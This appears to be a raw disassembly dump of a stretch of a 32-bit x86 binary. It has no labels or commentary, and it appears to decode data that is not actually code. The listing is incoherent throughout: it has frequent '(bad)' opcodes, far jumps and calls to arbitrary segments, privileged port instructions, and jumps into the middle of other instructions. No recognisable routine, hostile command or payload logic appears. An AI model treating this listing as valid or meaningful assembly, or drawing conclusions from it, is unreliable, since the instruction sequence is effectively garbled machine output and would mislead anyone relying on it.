  411cb3:	enter  0x3e51,0x46
  411cb7:	mov    ah,0xca
  411cb9:	rol    BYTE PTR [ebp+0x574df91],cl
  411cbf:	fxch   st(5)
  411cc1:	xor    ebp,DWORD PTR [ebx+edx*4-0x53]
  411cc5:	push   ss
  411cc6:	push   edx
  411cc7:	jns    0x411ceb
  411cc9:	inc    ecx
  411cca:	and    al,0x4f
  411ccc:	add    bh,bl
  411cce:	mov    BYTE PTR [eax],dh
  411cd0:	mov    edx,0xfe18e299
  411cd5:	gs inc esp
  411cd7:	out    dx,al
  411cd8:	inc    esp
  411cd9:	mov    cl,0x7e
  411cdb:	mov    ss,WORD PTR [ebx]
  411cdd:	nop/reserved BYTE PTR [edx]
  411ce0:	pusha  
  411ce1:	mov    cs,WORD PTR [esi-0x3]
  411ce4:	shl    BYTE PTR [ebp+0x580d31d6],cl
  411cea:	(bad)  
  411ceb:	pop    eax
  411cec:	jp     0x411d13
  411cee:	ficomp DWORD PTR [edx+edx*8-0x306d37ce]
  411cf5:	pop    edx
  411cf6:	mov    dl,BYTE PTR [ebx]
  411cf8:	rcr    BYTE PTR [ebp+edi*4+0x72],cl
  411cfc:	popa   
  411cfd:	jmp    0x411ce8
  411cff:	jno    0x411ca7
  411d01:	adc    bh,cl
  411d03:	inc    edx
  411d04:	test   DWORD PTR [eax+0x6a],ebp
  411d07:	jo     0x411d63
  411d09:	xor    dl,BYTE PTR [esi+0x6598d296]
  411d0f:	xor    ah,BYTE PTR ds:0xd9ce9393
  411d15:	push   ds
  411d16:	aad    0xb4
  411d18:	sub    DWORD PTR [edi-0x7f],ecx
  411d1b:	imul   eax,esp,0xd3b72e71
  411d21:	popa   
  411d22:	bsf    esi,DWORD PTR [esp+edi*8-0x1f]
  411d27:	bound  eax,QWORD PTR [esi-0x716a68]
  411d2d:	pop    edi
  411d2e:	test   al,0xb3
  411d30:	ret    0xbe9d
  411d33:	sub    dl,dl
  411d35:	rol    ecx,1
  411d37:	jg     0x411ce2
  411d39:	pushf  
  411d3a:	into   
  411d3b:	idiv   ebx
  411d3d:	adc    ecx,edx
  411d3f:	mov    dh,BYTE PTR [ebx]
  411d41:	outs   dx,DWORD PTR ds:[esi]
  411d42:	xchg   ebp,eax
  411d43:	xor    BYTE PTR [eax+ecx*8],bl
  411d46:	test   edx,ebp
  411d48:	cli    
  411d49:	push   ds
  411d4a:	jne    0x411d0a
  411d4c:	mov    ecx,0x6396320a
  411d51:	lahf   
  411d52:	outs   dx,DWORD PTR ds:[esi]
  411d53:	aad    0x27
  411d55:	and    DWORD PTR [edi-0x7a75f3ba],ecx
  411d5b:	add    eax,0x77c8e493
  411d60:	xchg   DWORD PTR [esi-0x14],esp
  411d63:	es inc eax
  411d65:	push   ds
  411d66:	or     dh,dl
  411d68:	retf   
  411d69:	into   
  411d6a:	fistp  DWORD PTR [edx+0x51]
  411d6d:	inc    ecx
  411d6e:	test   BYTE PTR [esi-0x6b504633],bh
  411d74:	cld    
  411d75:	call   0xd9e5:0xc1b58e7e
  411d7c:	fadd   DWORD PTR [esi-0x4d472723]
  411d82:	test   esi,esp
  411d84:	rol    DWORD PTR [ebx-0x48],0xa1
  411d88:	dec    edx
  411d89:	lods   al,BYTE PTR ds:[esi]
  411d8a:	repnz xchg edi,eax
  411d8c:	cdq    
  411d8d:	push   0x7e82d9cc
  411d92:	stos   BYTE PTR es:[edi],al
  411d93:	fs repz dec ebp
  411d96:	arpl   WORD PTR [ecx-0x2e],bx
  411d99:	xchg   DWORD PTR [ecx],ebx
  411d9b:	arpl   WORD PTR [esi+0x55],bp
  411d9e:	xchg   DWORD PTR [eax-0x40],ebp
  411da1:	jae    0x411d2e
  411da3:	(bad)  
  411da4:	je     0x411d4f
  411da6:	xor    DWORD PTR [esi],ecx
  411da8:	jnp    0x411dc8
  411daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dab:	push   edi
  411dac:	jle    0x411dd7
  411dae:	pop    ecx
  411daf:	adc    edx,edx
  411db1:	adc    DWORD PTR [ebx+0x24ce92fe],0x7d
  411db8:	fwait
  411db9:	adc    DWORD PTR [edi+0x22666c03],ecx
  411dbf:	or     BYTE PTR [esi+0x4f],al
  411dc2:	test   BYTE PTR [ecx-0x31625e47],al
  411dc8:	and    eax,0x6f8f4ecb
  411dcd:	mov    ebp,0x88a50da2
  411dd2:	mov    ?,WORD PTR [esi+0x4b]
  411dd5:	sbb    ah,BYTE PTR cs:[ebp+ebp*4-0x38]
  411dda:	pop    edi
  411ddb:	daa    
  411ddc:	push   edi
  411ddd:	add    eax,0xf2ffc539
  411de2:	xor    DWORD PTR [esi+edi*2+0x1f665154],edx
  411de9:	xchg   ecx,eax
  411dea:	xchg   edx,eax
  411deb:	sbb    eax,0x88090d3b
  411df0:	outs   dx,BYTE PTR ds:[esi]
  411df1:	aaa    
  411df2:	fmul   DWORD PTR [esi+0x79]
  411df5:	push   ebx
  411df6:	iret   
  411df7:	aam    0x67
  411df9:	or     ah,cl
  411dfb:	(bad)  
  411dfc:	rol    BYTE PTR [ebx-0x303e49a6],cl
  411e02:	adc    DWORD PTR [edi+0x5b0a114c],esp
  411e08:	inc    edi
  411e09:	dec    eax
  411e0a:	push   cs
  411e0b:	jnp    0x411d9d
  411e0d:	addr16 mov edi,ss
  411e10:	xchg   ebp,eax
  411e11:	adc    DWORD PTR [ecx-0x9],edi
  411e14:	sub    bh,ch
  411e16:	xchg   ebx,eax
  411e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e18:	jmp    0x9e60ae2d
  411e1d:	in     eax,dx
  411e1e:	mov    dl,0x68
  411e20:	inc    ebx
  411e21:	pop    esi
  411e22:	call   0xef300385
  411e27:	xchg   ebx,eax
  411e28:	push   di
  411e2a:	lds    ebp,FWORD PTR [esi]
  411e2c:	mov    esp,0x32100f5b
  411e31:	test   DWORD PTR [ecx+0x46624a5],ebx
  411e37:	ins    DWORD PTR es:[edi],dx
  411e38:	ret    
  411e39:	mov    bl,0xf0
  411e3b:	add    bl,ah
  411e3d:	loopne 0x411dcd
  411e3f:	jb     0x411e44
  411e41:	xchg   ebx,eax
  411e42:	inc    edi
  411e43:	xor    al,ch
  411e45:	nop
  411e46:	jns    0x411e56
  411e48:	(bad)  
  411e49:	xchg   ecx,eax
  411e4a:	iret   
  411e4b:	dec    edi
  411e4c:	xchg   ebx,eax
  411e4d:	adc    al,0x48
  411e4f:	lods   eax,DWORD PTR ds:[esi]
  411e50:	cmp    DWORD PTR [ebx+0x23d64445],edx
  411e56:	popa   
  411e57:	adc    al,0xd2
  411e59:	mov    ecx,0xdab1b422
  411e5e:	int    0x13
  411e60:	jge    0x411e80
  411e62:	xchg   edi,eax
  411e63:	add    BYTE PTR [edx-0x44],cl
  411e66:	fisttp DWORD PTR [edx]
  411e68:	das    
  411e69:	cmp    DWORD PTR [edx+0x1a2d8543],ecx
  411e6f:	pusha  
  411e70:	aad    0x6a
  411e72:	(bad)  
  411e73:	enter  0x7a06,0x4f
  411e77:	stos   DWORD PTR es:[edi],eax
  411e78:	adc    DWORD PTR [ebp+0x45bde57c],eax
  411e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e7f:	stc    
  411e80:	sbb    edx,ebx
  411e82:	or     esi,DWORD PTR ds:0x609d17d2
  411e88:	adc    esi,DWORD PTR [ecx]
  411e8a:	leave  
  411e8b:	cmp    bl,bl
  411e8d:	adc    DWORD PTR [edi],esp
  411e8f:	into   
  411e90:	fs in  eax,dx
  411e92:	adc    al,0xfc
  411e94:	lods   eax,DWORD PTR ds:[esi]
  411e95:	pop    esi
  411e96:	mov    WORD PTR [esi],gs
  411e98:	(bad)  
  411e99:	and    al,0xdf
  411e9b:	push   cs
  411e9c:	ins    DWORD PTR es:[edi],dx
  411e9d:	cmp    ecx,DWORD PTR [edi-0x40ad2157]
  411ea3:	inc    esi
  411ea4:	sub    eax,DWORD PTR [edx]
  411ea6:	nop
  411ea7:	std    
  411ea8:	shr    ch,cl
  411eaa:	and    dl,bh
  411eac:	fbstp  TBYTE PTR [ebx-0x6f]
  411eaf:	push   ds
  411eb0:	shl    DWORD PTR [edx+0x3e],1
  411eb3:	in     eax,dx
  411eb4:	cmc    
  411eb5:	jno    0x411e6a
  411eb7:	call   0x23e0:0x8eddfa9e
  411ebe:	cmp    BYTE PTR [ecx+ebp*4+0x50],bh
  411ec2:	mov    cl,0x14
  411ec4:	ror    BYTE PTR [ebp+0x2f1b0b5a],cl
  411eca:	dec    edx
  411ecb:	sub    DWORD PTR [ebp+0x1e],edx
  411ece:	iret   
  411ecf:	scas   al,BYTE PTR es:[edi]
  411ed0:	cld    
  411ed1:	jecxz  0x411e7c
  411ed3:	mov    ch,0x89
  411ed5:	mov    dh,0x85
  411ed7:	jp     0x411ed9
  411ed9:	(bad)  [esi-0x2e9d1599]
  411edf:	mov    cl,ah
  411ee1:	sub    eax,0x4929473d
  411ee6:	test   BYTE PTR [ecx-0x759ca7b4],ah
  411eec:	ja     0x411f0c
  411eee:	mov    dl,0x71
  411ef0:	mov    ecx,0xfbdac779
  411ef5:	cld    
  411ef6:	mov    BYTE PTR ds:0x3d94fe34,ch
  411efc:	mov    eax,0x7b7d979
  411f01:	adc    DWORD PTR [eax+0x7d],esp
  411f04:	mov    BYTE PTR [ebp-0x2d],0xe3
  411f08:	jp     0x411ef7
  411f0a:	mov    DWORD PTR [ebp+0x44671120],esp
  411f10:	push   ds
  411f11:	adc    BYTE PTR [edi+0x2],bl
  411f14:	mov    bh,0x1e
  411f16:	dec    ebp
  411f17:	fsin   
  411f19:	test   eax,0x5d163149
  411f1e:	mov    esi,0x8c6bd27d
  411f23:	call   0x112b:0xc3087f7
  411f2a:	pop    ebx
  411f2b:	push   ss
  411f2c:	sbb    al,0xa8
  411f2e:	xchg   edi,eax
  411f2f:	test   DWORD PTR [esi-0x32],eax
  411f32:	lea    eax,[edx+edx*4]
  411f35:	push   ds
  411f36:	ins    DWORD PTR es:[edi],dx
  411f37:	cmp    ebp,DWORD PTR [edi]
  411f39:	inc    ecx
  411f3a:	test   DWORD PTR [edx],eax
  411f3c:	xor    BYTE PTR [edi-0x20b3b905],0xdb
  411f43:	mov    al,0x7c
  411f45:	sub    BYTE PTR [edx-0x2cc5c372],bh
  411f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f4c:	and    eax,ebp
  411f4e:	test   DWORD PTR [ebx-0x7bc7e67b],esp
  411f54:	pop    es
  411f55:	aaa    
  411f56:	mov    ch,0xdb
  411f58:	push   edx
  411f59:	jns    0x411f60
  411f5b:	jno    0x411f7f
  411f5d:	inc    ebp
  411f5e:	lods   eax,DWORD PTR ds:[esi]
  411f5f:	ret    0xde01
  411f62:	in     al,dx
  411f63:	mov    eax,ds:0x1104550b
  411f68:	inc    ecx
  411f69:	fadd   st(3),st
  411f6b:	cld    
  411f6c:	or     al,0x11
  411f6e:	sbb    eax,0x536d2713
  411f73:	pop    edi
  411f74:	jle    0x411f68
  411f76:	into   
  411f77:	not    dl
  411f79:	dec    edi
  411f7a:	pop    es
  411f7b:	mov    DWORD PTR [eax+0xedde2d5],esp
  411f81:	add    al,0xcb
  411f83:	push   esi
  411f85:	push   ecx
  411f86:	out    dx,al
  411f87:	push   ebx
  411f88:	(bad)  
  411f89:	stc    
  411f8a:	test   ch,0xd2
  411f8d:	(bad)  
  411f8e:	jmp    0x74bb:0x8d394b86
  411f95:	jo     0x411f96
  411f97:	push   ds
  411f98:	pop    eax
  411f99:	adc    DWORD PTR ds:0xc7b79035,ebp
  411f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fa0:	bound  edx,QWORD PTR [edi+0x20]
  411fa3:	aaa    
  411fa4:	ror    al,cl
  411fa6:	test   BYTE PTR [ebp+0x71],0x33
  411faa:	dec    esp
  411fab:	in     al,0x6f
  411fad:	push   ds
  411fae:	rcl    BYTE PTR [edi-0x18e0db3],cl
  411fb4:	mov    al,0x16
  411fb6:	pop    ebx
  411fb7:	sub    dl,dl
  411fb9:	or     esp,DWORD PTR [esi+ecx*1-0x58]
  411fbd:	mov    ds:0x1e5319ad,al
  411fc2:	jge    0x41200a
  411fc4:	je     0x411f9d
  411fc6:	les    esi,FWORD PTR [esi+edx*4+0x7c]
  411fca:	fstp   TBYTE PTR [edx+0x7d98dfdc]
  411fd0:	test   eax,0x2367062
  411fd5:	jne    0x412055
  411fd7:	mov    ch,0x5a
  411fd9:	sbb    eax,0xaa37be19
  411fde:	jp     0x411f6e
  411fe0:	inc    DWORD PTR [edi]
  411fe2:	mov    ds:0x9b68d21e,eax
  411fe7:	dec    edi
  411fe8:	mov    ah,BYTE PTR ss:[ebp+0x2a]
  411fec:	in     eax,0x14
  411fee:	sbb    eax,0x59ee473
  411ff3:	dec    ebx
  411ff4:	ret    0xe7ef
  411ff7:	scas   al,BYTE PTR es:[edi]
  411ff8:	shl    dl,cl
  411ffa:	lahf   
  411ffb:	lahf   
  411ffc:	push   DWORD PTR [esi]
  411ffe:	mov    dh,al
  412000:	enter  0xdf7f,0x8e
  412004:	push   fs
  412006:	fadd   QWORD PTR cs:[ebx-0x7a]
  41200a:	mov    eax,ds:0xcb44d30f
  41200f:	jge    0x41207e
  412011:	add    eax,0x7ce2c611
  412016:	or     bh,BYTE PTR [eax-0x56a46130]
  41201c:	sub    eax,0xfe1ed71f
  412021:	mov    al,0x24
  412023:	outs   dx,BYTE PTR ds:[esi]
  412024:	cmc    
  412025:	pop    esi
  412026:	arpl   ax,bx
  412028:	scas   eax,DWORD PTR es:[edi]
  412029:	cmovno edi,DWORD PTR [ebp+0xd059a86]
  412030:	add    dl,ch
  412032:	fimul  DWORD PTR [esi-0x6c783b65]
  412038:	pushf  
  412039:	jne    0x412000
  41203b:	js     0x412024
  41203d:	into   
  41203e:	sub    DWORD PTR [ebx-0x2e],esp
  412041:	and    bh,BYTE PTR [esi-0x2e]
  412044:	js     0x412041
  412046:	xchg   ebp,eax
  412047:	scas   al,BYTE PTR es:[edi]
  412048:	adc    BYTE PTR [ecx],0x84
  41204b:	cmp    BYTE PTR [edx+0x5b32b66a],al
  412051:	not    dl
  412053:	sbb    edx,edx
  412055:	xor    BYTE PTR [esi],cl
  412057:	dec    eax
  412058:	test   al,0xd4
  41205a:	mov    esp,0xad11d1f3
  41205f:	in     eax,0x7f
  412061:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412063:	mov    al,ds:0xc485fe32
  412068:	mov    edx,0x3763bd2
  41206d:	or     BYTE PTR [edx-0x6e],ah
  412070:	in     al,dx
  412071:	dec    eax
  412072:	adc    dh,BYTE PTR [ecx+0xebc5115]
  412078:	or     eax,DWORD PTR [ecx]
  41207a:	test   DWORD PTR [eax],ecx
  41207c:	sub    edx,DWORD PTR [ebx+ecx*8-0x5d]
  412080:	addr16 popa 
  412082:	xor    cl,BYTE PTR [ebp+0x5e2b86bc]
  412088:	cmp    ebx,DWORD PTR [edi+0x62]
  41208b:	sbb    ah,BYTE PTR ds:0xe6b9859d
  412091:	scas   al,BYTE PTR es:[edi]
  412092:	xor    dh,dh
  412094:	jp     0x412095
  412096:	not    BYTE PTR [edi-0x1a83e8d4]
  41209c:	pop    si
  41209e:	popa   
  41209f:	daa    
  4120a0:	loope  0x4120ee
  4120a2:	test   BYTE PTR [esi],ch
  4120a4:	dec    edi
  4120a5:	push   eax
  4120a6:	jmp    0xd0a6:0x17d50162
  4120ad:	ss add eax,0xa463cbed
  4120b3:	pop    esi
  4120b4:	imul   edi,DWORD PTR [ecx+0x6baccd51],0xa7971743
  4120be:	sub    BYTE PTR [esi+0x45],ch
  4120c1:	cmp    al,ah
  4120c3:	mov    es,eax
  4120c5:	cmc    
  4120c6:	stc    
  4120c7:	xor    al,0x5e
  4120c9:	or     ebx,DWORD PTR [edi]
  4120cb:	cs shl bl,cl
  4120ce:	retf   0xd36d
  4120d1:	into   
  4120d2:	adc    BYTE PTR [ebx+0x12ce07a0],dh
  4120d8:	ds push ecx
  4120da:	sub    dh,cl
  4120dc:	fst    st(3)
  4120de:	dec    ebx
  4120df:	shl    ecx,cl
  4120e1:	add    cl,BYTE PTR [ecx+0x29]
  4120e4:	mov    eax,ds:0x5a94739e
  4120e9:	(bad)  
  4120ea:	jmp    0x412139
  4120ec:	stos   BYTE PTR es:[edi],al
  4120ed:	in     al,0xf6
  4120ef:	mov    ?,WORD PTR [eax-0x22]
  4120f2:	dec    eax
  4120f3:	jb     0x4120ae
  4120f5:	enter  0x92fd,0xdd
  4120f9:	in     eax,0x2c
  4120fb:	sub    dl,dl
  4120fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120fe:	push   ebp
  4120ff:	or     al,0x60
  412101:	addr16 mov al,ds:0x768e
  412105:	mov    dh,0x9b
  412107:	fistp  WORD PTR [ebx+0x21eedf0a]
  41210d:	mov    bl,0x8a
  41210f:	scas   al,BYTE PTR es:[edi]
  412110:	or     cl,BYTE PTR ds:0xac9d6153
  412116:	test   eax,0x746c29a1
  41211b:	mov    ds,WORD PTR [edi-0x518e9274]
  412121:	adc    al,0xba
  412123:	jg     0x4120fa
  412125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412126:	pop    ss
  412127:	(bad)  
  412128:	pop    esp
  412129:	push   ds
  41212a:	in     al,dx
  41212b:	mov    bh,0xb4
  41212d:	xor    dl,dh
  41212f:	mov    al,0xb5
  412131:	push   eax
  412132:	cmp    DWORD PTR [edx+0x12b3b4aa],edx
  412138:	xchg   edx,eax
  412139:	sbb    al,0x42
  41213b:	inc    edi
  41213c:	shl    BYTE PTR [eax+esi*2],cl
  41213f:	rol    bh,cl
  412141:	repnz jecxz 0x412158
  412144:	ins    BYTE PTR es:[edi],dx
  412145:	jbe    0x412119
  412147:	(bad)  
  412148:	xor    edx,DWORD PTR [ebx]
  41214a:	in     al,dx
  41214b:	into   
  41214c:	inc    ebx
  41214d:	out    dx,al
  41214e:	sub    BYTE PTR [ecx-0x4c0859d0],0x12
  412155:	pop    ebx
  412156:	test   BYTE PTR [edi-0x58],al
  412159:	adc    dl,bl
  41215b:	sub    eax,0xd7ea11cc
  412160:	into   
  412161:	stc    
  412162:	add    ecx,ecx
  412164:	scas   eax,DWORD PTR es:[edi]
  412165:	fcmovnbe st,st(0)
  412167:	jp     0x41213c
  412169:	icebp  
  41216a:	push   0x7c
  41216c:	cdq    
  41216d:	mov    ebp,0xf2bab727
  412172:	cmp    eax,0x6fcee38d
  412177:	sub    esi,DWORD PTR [esi]
  412179:	iret   
  41217a:	pop    ss
  41217b:	jle    0x41214f
  41217d:	icebp  
  41217e:	mov    dh,0xfd
  412180:	mov    edx,0xc8d4033d
  412185:	adc    DWORD PTR [ecx-0x59168205],edx
  41218b:	dec    ebx
  41218c:	mov    bl,0x36
  41218e:	test   eax,edi
  412190:	test   DWORD PTR [esi-0x442ab5d5],edi
  412196:	sub    BYTE PTR [esi-0x918f345],cl
  41219c:	mov    WORD PTR [ebp-0x132d7a70],gs
  4121a2:	sbb    ch,cl
  4121a4:	adc    BYTE PTR [edx],bh
  4121a6:	jg     0x4121e1
  4121a8:	dec    edi
  4121a9:	push   ds
  4121aa:	mov    eax,0x98eec849
  4121af:	scas   al,BYTE PTR es:[edi]
  4121b0:	or     eax,0xd70eeead
  4121b5:	icebp  
  4121b6:	lds    ebp,FWORD PTR [edx-0x22d33650]
  4121bc:	dec    ecx
  4121bd:	pusha  
  4121be:	(bad)  [ebp+0x207c861b]
  4121c4:	pusha  
  4121c5:	jle    0x41223f
  4121c7:	ret    0xbdb8
  4121ca:	cld    
  4121cb:	call   DWORD PTR [esi]
  4121cd:	jecxz  0x412219
  4121cf:	and    dl,dl
  4121d1:	pop    esi
  4121d2:	fadd   DWORD PTR [esi-0x711d97c7]
  4121d8:	pop    edx
  4121d9:	xor    cl,ch
  4121db:	mov    ds:0x57cb7325,eax
  4121e0:	rcr    BYTE PTR [esi],cl
  4121e2:	cmp    bh,cl
  4121e4:	push   ecx
  4121e5:	outs   dx,BYTE PTR ds:[esi]
  4121e6:	ds jecxz 0x4121de
  4121e9:	jmp    0xbf13666f
  4121ee:	and    esp,DWORD PTR [esi-0x3df861c4]
  4121f4:	ror    BYTE PTR [ebp-0x64be568d],cl
  4121fa:	je     0x41224f
  4121fc:	rcl    DWORD PTR [ecx],cl
  4121fe:	xchg   dh,ah
  412200:	adc    BYTE PTR [ecx],ch
  412202:	(bad)  
  412203:	lock mov al,0x5f
  412206:	test   BYTE PTR [eax+0x2fcccd4b],dh
  41220c:	(bad)  
  41220d:	cmp    esp,DWORD PTR [esi]
  41220f:	mov    ?,esi
  412211:	mov    BYTE PTR [ecx+eiz*1+0xb02ec48],bh
  412218:	rol    BYTE PTR [eax+0x35b636cd],cl
  41221e:	inc    ebp
  41221f:	leave  
  412220:	popf   
  412221:	adc    DWORD PTR [edi+0x31],edi
  412224:	adc    dh,BYTE PTR [esi]
  412226:	(bad)  
  412227:	hlt    
  412228:	cmp    BYTE PTR ds:0x667568ec,bl
  41222e:	add    al,0x74
  412230:	and    DWORD PTR [esi+0x11c35142],ebp
  412236:	inc    edi
  412237:	lock cmp edi,DWORD PTR [eax-0x538b1a26]
  41223e:	jmp    0xc5f323c6
  412243:	jae    0x4121cf
  412245:	js     0x4121df
  412247:	pop    eax
  412248:	jmp    0xa86d885e
  41224d:	push   0xf6009a4b
  412252:	test   DWORD PTR [ebp+0x7f],ecx
  412255:	(bad)  
  412256:	or     al,0xa0
  412258:	xchg   BYTE PTR [edi],ah
  41225a:	push   edi
  41225b:	mov    fs,WORD PTR [ebp-0x1c4e91af]
  412261:	or     al,0x62
  412263:	or     edx,edx
  412265:	mov    ah,0xc8
  412267:	test   DWORD PTR [ebx-0x41cc2b71],esp
  41226d:	adc    DWORD PTR [eax+0x71],edi
  412270:	xchg   ecx,eax
  412271:	add    BYTE PTR [edx],bl
  412273:	neg    DWORD PTR [esi+eax*4]
  412276:	test   ecx,edx
  412278:	test   DWORD PTR [ebp+0x63],0x698a2320
  41227f:	mov    ?,ebx
  412281:	dec    ebx
  412282:	push   esp
  412283:	test   eax,0xc9ab3504
  412288:	mov    bh,bh
  41228a:	lea    ecx,ds:0x977591bf
  412290:	dec    ebx
  412291:	into   
  412292:	push   0x4311359d
  412297:	mov    esi,0x2078bf63
  41229c:	and    bl,BYTE PTR [eax+0x7cd22e49]
  4122a2:	(bad)  
  4122a4:	cld    
  4122a5:	inc    ebp
  4122a6:	push   eax
  4122a7:	mov    ah,0x19
  4122a9:	adc    DWORD PTR [edi+0x15],esi
  4122ac:	push   edx
  4122ad:	pop    eax
  4122ae:	and    DWORD PTR [ebx],0xdafcfed0
  4122b4:	mov    ecx,0xcf0eb8ab
  4122b9:	xor    edx,ecx
  4122bb:	cdq    
  4122bc:	pop    ss
  4122bd:	adc    DWORD PTR [ecx+0x40bcc63d],ebp
  4122c3:	cli    
  4122c4:	xor    DWORD PTR [ebx-0x7c4eef7b],ebx
  4122ca:	dec    esi
  4122cb:	or     eax,0xde61ec21
  4122d0:	mov    edx,0x559cb126
  4122d5:	mov    esi,0xc552456c
  4122da:	mov    eax,ds:0x85c5b24c
  4122df:	push   edi
  4122e0:	sbb    al,0x1d
  4122e2:	push   edi
  4122e3:	push   eax
  4122e4:	(bad)  
  4122e5:	loopne 0x41226f
  4122e7:	mov    fs,WORD PTR [edi-0x43]
  4122ea:	and    ch,BYTE PTR [esi+0x61e1297a]
  4122f0:	lods   eax,DWORD PTR ds:[esi]
  4122f1:	xchg   esi,eax
  4122f2:	ss test eax,0x2d3f38f0
  4122f8:	aam    0x3d
  4122fa:	ror    BYTE PTR [esi+0x39cd0f80],0x41
  412301:	sti    
  412302:	adc    eax,0xbca3d231
  412307:	into   
  412308:	retf   0x6ea0
  41230b:	mov    esi,0x845110a8
  412310:	and    dh,BYTE PTR [esi+edi*2+0x13]
  412314:	mov    ecx,0x968f1e11
  412319:	call   0x775250a3
  41231e:	rol    bl,cl
  412320:	pushf  
  412321:	and    cl,BYTE PTR [esi]
  412323:	mov    ?,esi
  412325:	addr16 dec eax
  412327:	adc    BYTE PTR [ebx+0x3d2471e9],ch
  41232d:	bound  ecx,QWORD PTR [ebx-0x798dfacb]
  412333:	mov    esp,0x5451562d
  412338:	xchg   esi,eax
  412339:	adc    DWORD PTR [edx-0x48320681],ebp
  41233f:	push   es
  412340:	or     cl,BYTE PTR [edi]
  412342:	test   DWORD PTR [ecx-0x3ac7fa46],ecx
  412348:	dec    esi
  412349:	lock daa 
  41234b:	mov    ds,edi
  41234d:	mov    edx,0xd0622d3d
  412352:	pushf  
  412353:	sbb    dl,dl
  412355:	pop    edx
  412356:	repz sti 
  412358:	clc    
  412359:	faddp  st(2),st
  41235b:	fst    DWORD PTR [edx+0x1e]
  41235e:	rcl    DWORD PTR [eax-0x52f58c8a],1
  412364:	jmp    0x630321de
  412369:	mov    ds:0xf1b3cd2e,al
  41236e:	cmp    DWORD PTR [ebx-0x2c],0x21eae711
  412375:	mov    cl,0x8e
  412377:	sbb    BYTE PTR [esi],al
  412379:	(bad)  
  41237a:	jmp    0x85594fcb
  41237f:	cmp    esi,0x33
  412382:	int    0xdd
  412384:	imul   ebx,DWORD PTR [edi],0x6fef5b61
  41238a:	inc    ebx
  41238b:	sar    BYTE PTR ds:0xd225b721,cl
  412391:	adc    edx,DWORD PTR [eax+0x6a2aab9d]
  412397:	adc    al,0xc6
  412399:	adc    edx,esp
  41239b:	outs   dx,DWORD PTR ds:[esi]
  41239c:	pop    eax
  41239d:	or     BYTE PTR [esi+ecx*8],bh
  4123a0:	(bad)  
  4123a1:	rol    BYTE PTR [ebp+0x1920a847],1
  4123a7:	sahf   
  4123a8:	mov    eax,DWORD PTR [eax]
  4123aa:	fisttp WORD PTR [edi+0x4da7a496]
  4123b0:	or     al,0xaa
  4123b2:	mov    BYTE PTR cs:[ecx-0x2d2673cf],0x26
  4123ba:	dec    ebp
  4123bb:	jp     0x41234f
  4123bd:	ror    DWORD PTR [ecx+0x611b5c2],1
  4123c3:	nop
  4123c4:	fisubr DWORD PTR [edi]
  4123c6:	dec    esp
  4123c7:	cmp    eax,0xa585b542
  4123cc:	and    al,0x72
  4123ce:	(bad)  
  4123cf:	mov    dl,0x62
  4123d1:	mov    al,0x1f
  4123d3:	xchg   ecx,eax
  4123d4:	xor    al,0xf8
  4123d6:	sbb    dh,cl
  4123d8:	test   al,0x91
  4123da:	pop    esi
  4123db:	push   edx
  4123dc:	fcomi  st,st(0)
  4123de:	test   DWORD PTR [ebx+0x41],eax
  4123e1:	repnz call 0x9f8e:0xec605696
  4123e9:	xchg   esi,eax
  4123ea:	inc    edi
  4123eb:	xchg   DWORD PTR [edi-0x15],esp
  4123ee:	mov    esi,0x28c5a9ba
  4123f3:	sbb    eax,0x31532e5
  4123f8:	or     BYTE PTR [edx-0x5f31718f],dh
  4123fe:	stos   BYTE PTR es:[edi],al
  4123ff:	mov    edi,0xae139942
  412404:	scas   al,BYTE PTR es:[edi]
  412405:	and    bh,BYTE PTR [ecx+0x5a3a7af]
  41240b:	dec    eax
  41240c:	or     ebp,DWORD PTR [edx]
  41240e:	xchg   edi,eax
  41240f:	mov    ss,esp
  412411:	pop    ebp
  412412:	and    BYTE PTR [ecx-0x4d],bh
  412415:	call   0x53ee95df
  41241a:	mov    esi,0x1974e440
  41241f:	mov    esi,0x98fe3e84
  412424:	adc    ebp,ebp
  412426:	sbb    al,0x3c
  412428:	popa   
  412429:	sahf   
  41242a:	mov    esi,DWORD PTR [ecx]
  41242c:	mov    ds:0xb89168b0,al
  412431:	mov    BYTE PTR [ebp+0x7030f939],0x19
  412438:	jp     0x41242d
  41243a:	dec    esi
  41243b:	xchg   ebx,eax
  41243c:	cmc    
  41243d:	arpl   WORD PTR [ebp+edi*2+0x43],bp
  412441:	pop    edi
  412442:	and    al,0x63
  412444:	enter  0xd3ec,0x6c
  412448:	loopne 0x412488
  41244a:	ja     0x4123da
  41244c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41244d:	jb     0x4123fb
  41244f:	lock stc 
  412451:	mov    ecx,0xaffb9379
  412456:	pop    edx
  412457:	aaa    
  412458:	cwde   
  412459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41245a:	jne    0x4124be
  41245c:	xchg   esi,eax
  41245d:	and    al,BYTE PTR [ebp+0x1edb2bde]
  412463:	ds icebp 
  412465:	popf   
  412466:	pop    ds
  412467:	mov    BYTE PTR [ebx+0x50e9b3b],dh
  41246d:	xlat   BYTE PTR ds:[ebx]
  41246e:	push   0x9563e794
  412473:	sbb    esp,DWORD PTR [edx-0x72]
  412476:	ss ss loop 0x412425
  41247a:	jg     0x412409
  41247c:	push   0xebdf6125
  412481:	pusha  
  412482:	jmp    0x8832:0x853f23ee
  412489:	or     DWORD PTR [eax],edx
  41248b:	mov    ebp,0x934046bc
  412490:	test   eax,0x10c6227c
  412495:	scas   eax,DWORD PTR es:[edi]
  412496:	or     eax,0xff16337c
  41249b:	je     0x412501
  41249d:	or     eax,0x8f3eee4d
  4124a2:	mov    ebx,0xe600c254
  4124a7:	mov    ds:0xdd411f7,al
  4124ac:	mov    al,0x12
  4124ae:	fcmovu st,st(5)
  4124b0:	ror    BYTE PTR [ecx-0x61],cl
  4124b3:	scas   al,BYTE PTR es:[edi]
  4124b4:	inc    esp
  4124b5:	int3   
  4124b6:	shl    DWORD PTR [ecx+0x48],0x1e
  4124ba:	out    0x7c,eax
  4124bc:	push   esp
  4124bd:	mov    eax,ds:0x9210e8b6
  4124c2:	test   ecx,edx
  4124c4:	pop    esi
  4124c6:	mov    edx,0xf07be59b
